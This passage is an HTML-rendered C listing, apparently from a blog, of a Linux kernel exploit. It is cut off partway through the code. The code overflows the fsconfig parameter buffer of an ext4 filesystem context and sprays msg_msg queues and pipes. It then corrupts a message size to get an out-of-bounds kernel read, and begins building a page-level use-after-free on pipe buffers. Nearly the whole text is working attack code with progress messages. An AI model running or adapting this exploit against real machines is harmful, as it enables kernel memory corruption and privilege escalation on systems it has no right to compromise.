class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br><span class="line">456</span><br><span class="line">457</span><br><span class="line">458</span><br><span class="line">459</span><br><span class="line">460</span><br><span class="line">461</span><br><span class="line">462</span><br><span class="line">463</span><br><span class="line">464</span><br><span class="line">465</span><br><span class="line">466</span><br><span class="line">467</span><br><span class="line">468</span><br><span class="line">469</span><br><span class="line">470</span><br><span class="line">471</span><br><span class="line">472</span><br><span class="line">473</span><br><span class="line">474</span><br><span class="line">475</span><br><span class="line">476</span><br><span class="line">477</span><br><span class="line">478</span><br><span class="line">479</span><br><span class="line">480</span><br><span class="line">481</span><br><span class="line">482</span><br><span class="line">483</span><br><span class="line">484</span><br><span class="line">485</span><br><span class="line">486</span><br><span class="line">487</span><br><span class="line">488</span><br><span class="line">489</span><br><span class="line">490</span><br><span class="line">491</span><br><span class="line">492</span><br><span class="line">493</span><br><span class="line">494</span><br><span class="line">495</span><br><span class="line">496</span><br><span class="line">497</span><br><span class="line">498</span><br><span class="line">499</span><br><span class="line">500</span><br><span class="line">501</span><br><span class="line">502</span><br><span class="line">503</span><br><span class="line">504</span><br><span class="line">505</span><br><span class="line">506</span><br><span class="line">507</span><br><span class="line">508</span><br><span class="line">509</span><br><span class="line">510</span><br><span class="line">511</span><br><span class="line">512</span><br><span class="line">513</span><br><span class="line">514</span><br><span class="line">515</span><br><span class="line">516</span><br><span class="line">517</span><br><span class="line">518</span><br><span class="line">519</span><br><span class="line">520</span><br><span class="line">521</span><br><span class="line">522</span><br><span class="line">523</span><br><span class="line">524</span><br><span class="line">525</span><br><span class="line">526</span><br><span class="line">527</span><br><span class="line">528</span><br><span class="line">529</span><br><span class="line">530</span><br><span class="line">531</span><br><span class="line">532</span><br><span class="line">533</span><br><span class="line">534</span><br><span class="line">535</span><br><span class="line">536</span><br><span class="line">537</span><br><span class="line">538</span><br><span class="line">539</span><br><span class="line">540</span><br><span class="line">541</span><br><span class="line">542</span><br><span class="line">543</span><br><span class="line">544</span><br><span class="line">545</span><br><span class="line">546</span><br><span class="line">547</span><br><span class="line">548</span><br><span class="line">549</span><br><span class="line">550</span><br><span class="line">551</span><br><span class="line">552</span><br><span class="line">553</span><br><span class="line">554</span><br><span class="line">555</span><br><span class="line">556</span><br><span class="line">557</span><br><span class="line">558</span><br><span class="line">559</span><br><span class="line">560</span><br><span class="line">561</span><br><span class="line">562</span><br><span class="line">563</span><br><span class="line">564</span><br><span class="line">565</span><br><span class="line">566</span><br><span class="line">567</span><br><span class="line">568</span><br><span class="line">569</span><br><span class="line">570</span><br><span class="line">571</span><br><span class="line">572</span><br><span class="line">573</span><br><span class="line">574</span><br><span class="line">575</span><br><span class="line">576</span><br><span class="line">577</span><br><span class="line">578</span><br><span class="line">579</span><br><span class="line">580</span><br><span class="line">581</span><br><span class="line">582</span><br><span class="line">583</span><br><span class="line">584</span><br><span class="line">585</span><br><span class="line">586</span><br><span class="line">587</span><br><span class="line">588</span><br><span class="line">589</span><br><span class="line">590</span><br><span class="line">591</span><br><span class="line">592</span><br><span class="line">593</span><br><span class="line">594</span><br><span class="line">595</span><br><span class="line">596</span><br><span class="line">597</span><br><span class="line">598</span><br><span class="line">599</span><br><span class="line">600</span><br><span class="line">601</span><br><span class="line">602</span><br><span class="line">603</span><br><span class="line">604</span><br><span class="line">605</span><br><span class="line">606</span><br><span class="line">607</span><br><span class="line">608</span><br><span class="line">609</span><br><span class="line">610</span><br><span class="line">611</span><br><span class="line">612</span><br><span class="line">613</span><br><span class="line">614</span><br><span class="line">615</span><br><span class="line">616</span><br><span class="line">617</span><br><span class="line">618</span><br><span class="line">619</span><br><span class="line">620</span><br><span class="line">621</span><br><span class="line">622</span><br><span class="line">623</span><br><span class="line">624</span><br><span class="line">625</span><br><span class="line">626</span><br><span class="line">627</span><br><span class="line">628</span><br><span class="line">629</span><br><span class="line">630</span><br><span class="line">631</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> _GNU_SOURCE </span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdint.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;linux/mount.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sched.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/syscall.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/mman.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sched.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/types.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/ipc.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/msg.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/prctl.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MSG_NOERROR     010000  <span class="hljs-comment">/* no error if message is too big */</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MSG_COPY        040000  <span class="hljs-comment">/* copy (not remove) all queue messages */</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">ifndef</span> __NR_fsopen</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> __NR_fsopen 430</span><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">ifndef</span> __NR_fsconfig</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> __NR_fsconfig 431</span><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">ifndef</span> __NR_msgget</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> __NR_msgget 186</span><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">ifndef</span> __NR_msgget</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> __NR_msgsnd 189</span><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">ifndef</span> __NR_msgget</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> __NR_msgrcv 188</span><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><br><br><span class="hljs-comment">/* to run the exp on the specific core only */</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">bind_cpu</span><span class="hljs-params">(<span class="hljs-type">int</span> core)</span><br>&#123;<br>    <span class="hljs-type">cpu_set_t</span> cpu_set;<br><br>    CPU_ZERO(&amp;cpu_set);<br>    CPU_SET(core, &amp;cpu_set);<br>    sched_setaffinity(getpid(), <span class="hljs-keyword">sizeof</span>(cpu_set), &amp;cpu_set);<br>&#125;<br><br><span class="hljs-type">int</span> fs_fd;                 <span class="hljs-comment">/* using by filesystem */</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PRINT_ADDR(str, x) printf(<span class="hljs-string">&quot;\033[0m\033[1;34m[+]%s \033[0m:0x%lx\n&quot;</span>, str, x)</span><br><br><span class="hljs-type">void</span> <span class="hljs-title function_">info_log</span><span class="hljs-params">(<span class="hljs-type">char</span>* str)</span>&#123;<br> <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[0m\033[1;32m[+]%s\033[0m\n&quot;</span>,str);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">error_log</span><span class="hljs-params">(<span class="hljs-type">char</span>* str)</span>&#123;<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[0m\033[1;31m[-]%s\033[0m\n&quot;</span>,str);<br>  <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>&#125;<br><br><span class="hljs-type">long</span> <span class="hljs-title function_">get_msg</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span>&#123;<br>    <span class="hljs-keyword">return</span> msgget(IPC_PRIVATE, <span class="hljs-number">0666</span> | IPC_CREAT);<br>&#125;<br><br><span class="hljs-type">long</span> <span class="hljs-title function_">send_msg</span><span class="hljs-params">(<span class="hljs-type">int</span> msqid, <span class="hljs-type">void</span>* msgp, <span class="hljs-type">size_t</span> msgsz, <span class="hljs-type">long</span> msgflg)</span>&#123;<br>    ((<span class="hljs-keyword">struct</span> msgbuf *)msgp)-&gt;mtype = msgflg;<br>    <span class="hljs-keyword">return</span> msgsnd(msqid, msgp, msgsz, <span class="hljs-number">0</span>);<br>&#125;<br><br><span class="hljs-type">long</span> <span class="hljs-title function_">recv_msg</span><span class="hljs-params">(<span class="hljs-type">int</span> msqid, <span class="hljs-type">void</span>* msgp, <span class="hljs-type">size_t</span> msgsz, <span class="hljs-type">long</span> msgtyp)</span>&#123;<br>    <span class="hljs-keyword">return</span> msgrcv(msqid, msgp, msgsz, msgtyp, <span class="hljs-number">0</span>);<br>&#125;<br><br><span class="hljs-type">long</span> <span class="hljs-title function_">copy_msg</span><span class="hljs-params">(<span class="hljs-type">int</span> msqid, <span class="hljs-type">void</span>* msgp, <span class="hljs-type">size_t</span> msgsz, <span class="hljs-type">long</span> msgtyp)</span>&#123;<br>    <span class="hljs-keyword">return</span> msgrcv(msqid, msgp, msgsz, msgtyp, IPC_NOWAIT | MSG_COPY | MSG_NOERROR);<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">fsopen</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span> *fs_name, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> flags)</span><br>&#123;<br>    <span class="hljs-keyword">return</span> syscall(__NR_fsopen, fs_name, flags);<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">fsconfig</span><span class="hljs-params">(<span class="hljs-type">int</span> fsfd, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> cmd, </span><br><span class="hljs-params">             <span class="hljs-type">const</span> <span class="hljs-type">char</span> *key, <span class="hljs-type">const</span> <span class="hljs-type">void</span> *val, <span class="hljs-type">int</span> aux)</span><br>&#123;<br>    <span class="hljs-keyword">return</span> syscall(__NR_fsconfig, fsfd, cmd, key, val, aux);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">prepare_for_overwrite</span><span class="hljs-params">()</span>&#123;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*]Opening the ext4 filesystem&quot;</span>);<br>    fs_fd = fsopen(<span class="hljs-string">&quot;ext4&quot;</span>, <span class="hljs-number">0</span>);<br>    <span class="hljs-keyword">if</span> (fs_fd &lt; <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Opening&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>    &#125;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">186</span>; i++) &#123;<br>        fsconfig(fs_fd, FSCONFIG_SET_STRING, <span class="hljs-string">&quot;peiwithhao&quot;</span>, <span class="hljs-string">&quot;peiwithhao&quot;</span>, <span class="hljs-number">0</span>);<br>    &#125;<br>    fsconfig(fs_fd, FSCONFIG_SET_STRING, <span class="hljs-string">&quot;\x00&quot;</span>, <span class="hljs-string">&quot;P&quot;</span>, <span class="hljs-number">0</span>);<br><br>&#125;<br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PIPE_SPRAY_NR 0x100</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MSG_SPRAY_NR 0x100</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MSG_SZ (0x1000 - 0x30 + 0x20 - 0x8)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> OOB_READ_SZ (0x2000 - 0x30 - 0x8)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MSG_TYPE 0x41414141</span><br><span class="hljs-type">int</span> pipe_fd[PIPE_SPRAY_NR][<span class="hljs-number">2</span>];<br><span class="hljs-type">int</span> msqid[MSG_SPRAY_NR];<br><span class="hljs-type">int</span> victim_qidx = <span class="hljs-number">-1</span>;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">occupy_4k_obj_by_msg</span><span class="hljs-params">()</span>&#123;<br>    <span class="hljs-type">size_t</span> buf[<span class="hljs-number">0x1000</span>];<br>    <span class="hljs-type">char</span> pat[<span class="hljs-number">0x100</span>];<br>    info_log(<span class="hljs-string">&quot;Step I:Construct the first page uaf...&quot;</span>);<br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*]Allocating the pipe...&quot;</span>);<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; PIPE_SPRAY_NR; i++)&#123;<br>        <span class="hljs-keyword">if</span>(pipe(pipe_fd[i]) &lt; <span class="hljs-number">0</span>)&#123;<br>            error_log(<span class="hljs-string">&quot;Allocating the pipe failed!&quot;</span>);<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*]Allocating the msg_queue and msg_msg...&quot;</span>);<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; MSG_SPRAY_NR - <span class="hljs-number">8</span>; i++)&#123;<br>        <span class="hljs-keyword">if</span>((msqid[i] = get_msg()) &lt; <span class="hljs-number">0</span>)&#123;<br>            error_log(<span class="hljs-string">&quot;Allocating the msg_queue failed!&quot;</span>);<br>        &#125;<br>        buf[<span class="hljs-number">0</span>] = i;<br>        buf[MSG_SZ/<span class="hljs-number">8</span>] = i;<br>        <span class="hljs-keyword">if</span>(send_msg(msqid[i], buf, MSG_SZ, MSG_TYPE))&#123;<br>            error_log(<span class="hljs-string">&quot;Write the msg failed!&quot;</span>);<br>        &#125;<br>    &#125;<br><br>    prepare_for_overwrite();<br>    <span class="hljs-built_in">memset</span>(pat, <span class="hljs-string">&#x27;\x42&#x27;</span>, <span class="hljs-keyword">sizeof</span>(pat));<br>    pat[<span class="hljs-number">21</span>] = <span class="hljs-string">&#x27;\x00&#x27;</span>;<br>    fsconfig(fs_fd, FSCONFIG_SET_STRING, <span class="hljs-string">&quot;\x00&quot;</span>, pat, <span class="hljs-number">0</span>);<br>    <br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = MSG_SPRAY_NR - <span class="hljs-number">8</span>; i &lt; MSG_SPRAY_NR; i++)&#123;<br>        <span class="hljs-keyword">if</span>((msqid[i] = get_msg()) &lt; <span class="hljs-number">0</span>)&#123;<br>            error_log(<span class="hljs-string">&quot;Allocating the msg_queue failed!&quot;</span>);<br>        &#125;<br>        buf[<span class="hljs-number">0</span>] = i;<br>        buf[MSG_SZ/<span class="hljs-number">8</span>] = i;<br>        <span class="hljs-type">int</span> ret = send_msg(msqid[i], buf, MSG_SZ, MSG_TYPE); <br>        <span class="hljs-keyword">if</span>(send_msg(msqid[i], buf, MSG_SZ, MSG_TYPE))&#123;<br>            error_log(<span class="hljs-string">&quot;Write the msg failed!&quot;</span>);<br>        &#125;<br>    &#125;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*]Trying to overwrite the msg_msg-&gt;m_ts...&quot;</span>);<br>    fsconfig(fs_fd, FSCONFIG_SET_STRING, <span class="hljs-string">&quot;\x00&quot;</span>, <span class="hljs-string">&quot;\xc8\x1f&quot;</span>, <span class="hljs-number">0</span>);<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*]Trying to make an oob read...&quot;</span>);<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; MSG_SPRAY_NR; i++)&#123;<br>        <span class="hljs-type">int</span> read_sz = copy_msg(msqid[i], buf, OOB_READ_SZ, <span class="hljs-number">0</span>);<br>        <span class="hljs-keyword">if</span>(read_sz &lt; <span class="hljs-number">0</span>)&#123;<br>            error_log(<span class="hljs-string">&quot;read msg failed!&quot;</span>);<br>        &#125;<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(read_sz &gt; MSG_SZ)&#123;<br>            victim_qidx = i;<br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">if</span>(victim_qidx == <span class="hljs-number">-1</span>)&#123;<br>        error_log(<span class="hljs-string">&quot;failed to find the victim_qidx!&quot;</span>);<br>    &#125;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[0m\033[1;34m[*]We found the victim_msq_queue_idx\033[0m:%d\n&quot;</span>, victim_qidx);<br>&#125;<br><br><span class="hljs-type">int</span> victim_pid = <span class="hljs-number">-1</span>, orig_pid;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">construct_first_uaf</span><span class="hljs-params">()</span>&#123;<br>    <span class="hljs-type">size_t</span> buf[<span class="hljs-number">0x1000</span>];<br>    info_log(<span class="hljs-string">&quot;Step II:Construct the first page level uaf&quot;</span>);<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*]We need to free the msg_msg except the corrupted one!&quot;</span>);<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; MSG_SPRAY_NR; i++)&#123;<br>        <span class="hljs-keyword">if</span>(i == victim_qidx)&#123;<br>            <span class="hljs-keyword">continue</span>;<br>        &#125;<br>        <span class="hljs-keyword">if</span>(recv_msg(msqid[i], buf, MSG_SZ, <span class="hljs-number">0</span>) &lt; <span class="hljs-number">0</span>)&#123;<br>            error_log(<span class="hljs-string">&quot;unlink the msg_msg failed!&quot;</span>);<br>        &#125;<br>        <span class="hljs-keyword">if</span>(fcntl(pipe_fd[i][<span class="hljs-number">1</span>], F_SETPIPE_SZ, <span class="hljs-number">0x1000</span>*<span class="hljs-number">64</span>) &lt; <span class="hljs-number">0</span>)&#123;     <span class="hljs-comment">/* pipe_buffers is 64*0x28 */</span><br>            error_log(<span class="hljs-string">&quot;realloc pipe failed...&quot;</span>);<br>        &#125;<br>        write(pipe_fd[i][<span class="hljs-number">1</span>], <span class="hljs-string">&quot;peiadhao&quot;</span>, <span class="hljs-number">8</span>);<br>        write(pipe_fd[i][<span class="hljs-number">1</span>], &amp;i, <span class="hljs-keyword">sizeof</span>(<span class="hljs-type">int</span>));<br>        write(pipe_fd[i][<span class="hljs-number">1</span>], &amp;i, <span class="hljs-keyword">sizeof</span>(<span class="hljs-type">int</span>));<br>        write(pipe_fd[i][<span class="hljs-number">1</span>], &amp;i, <span class="hljs-keyword">sizeof</span>(<span class="hljs-type">int</span>));<br>        write(pipe_fd[i][<span class="hljs-number">1</span>], <span class="hljs-string">&quot;peiadhao&quot;</span>, <span class="hljs-number">8</span>);<br>        write(pipe_fd[i][<span class="hljs-number">1</span>], <span class="hljs-string">&quot;peiadhao&quot;</span>, <span class="hljs-number">8</span>);<br>    &#125;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*]Overflow the pipe_buffers by one null byte...&quot;</span>);<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">185</span>; i++)&#123;<br>        fsconfig(fs_fd, FSCONFIG_SET_STRING, <span class="hljs-string">&quot;peiwithhao&quot;</span>, <span class="hljs-string">&quot;peiwithhao&quot;</span>, <span class="hljs-number">0</span>);<br>    &#125;<br>    <br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; PIPE_SPRAY_NR; i++)&#123;<br>        <span class="hljs-type">char</span> tmp[<span class="hljs-number">0x10</span>];<br>        <span class="hljs-type">int</span> nr;<br>        <br>        <span class="hljs-keyword">if</span>(i == victim_qidx)&#123;<br>            <span class="hljs-keyword">continue</span>;<br>        &#125;<br><br>        <span class="hljs-keyword">if</span>(read(pipe_fd[i][<span class="hljs-number">0</span>], tmp, <span class="hljs-number">8</span>) &lt; <span class="hljs-number">0</span>)&#123;<br>            error_log(<span class="hljs-string">&quot;read pipe failed!&quot;</span>);<br>        &#125;<br>        <span class="hljs-keyword">if</span>(read(pipe_fd[i][<span class="hljs-number">0</span>], &amp;nr, <span class="hljs-keyword">sizeof</span>(<span class="hljs-type">int</span>)) &lt; <span class="hljs-number">0</span>)&#123;<br>            error_log(<span class="hljs-string">&quot;read pipe failed!&quot;</span>);<br>        &#125;<br>        <span 